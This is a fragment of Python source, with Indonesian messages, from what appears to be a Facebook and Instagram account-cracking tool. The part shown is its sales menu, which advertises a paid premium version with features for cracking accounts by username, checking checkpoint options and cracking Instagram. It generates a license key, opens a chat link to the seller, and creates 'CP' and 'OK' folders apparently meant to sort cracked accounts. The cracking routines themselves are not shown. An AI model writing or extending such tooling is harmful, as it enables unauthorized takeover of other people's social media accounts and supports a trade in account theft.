crot=(kode1+kode3+kode4+kode5+crot4+crot1+kode4+crot4+kode5+crot1+kode2+crot3)

_key=crot
def perbayar():
    _deku_uraraka("\n %s[%s•%s•%s] Harga script premium 35k"%(p,m,k,p))
    _deku_uraraka("\n %s[%s Keuntungan %s]%s"%(b,p,b,p))
    _deku_uraraka(" %s[%s•%s•%s] Crack langsung menampilkan opsi checkpoint"%(p,m,k,p))
    _deku_uraraka(" %s[%s•%s•%s] Membuka menu crack lebih dari 10Rb+"%(p,m,k,p))
    #_deku_uraraka(" %s[%s•%s•%s] Membuka menu ambil id from username facebook"%(p,m,k,p))
    _deku_uraraka(" %s[%s•%s•%s] Membuka menu check opsi checkpoint"%(p,m,k,p))
    _deku_uraraka(" %s[%s•%s•%s] Membuka menu crack from username"%(p,m,k,p))
    _deku_uraraka(" %s[%s•%s•%s] Membuka menu crack instagram"%(p,m,k,p))
    _deku_uraraka("\n %s[%s•%s•%s] Beli versi premium? [y/t]"%(p,m,k,p))
    _yakin=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
    if _yakin in ["y","Y"]:
        _deku_uraraka("\n %s[%s•%s•%s] Lisensi key: %s"%(p,m,k,p,_key))
        _deku_uraraka(" %s[%s•%s•%s] Salin lisensinya lalu kirim ke admin"%(p,m,k,p))
        _deku_uraraka(" %s[%s•%s•%s] Agar admin memproses versi premium mu!"%(p,m,k,p))
        time.sleep(3)
        open("lisenc.log","w").write(_key)
        _c=("?text=Assalamualaikum+bang+deku,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+_key)
        __sys__deku("xdg-open %s%s"%(urlw,_c))
        exit()
    else:menu()


def folder():
    try:
        os.mkdir("CP")
    except:pass
    try:
        os.mkdir("OK")
    except:pass

if __name__=="__main__":
    os.system("git pull")
    folder()
    menu()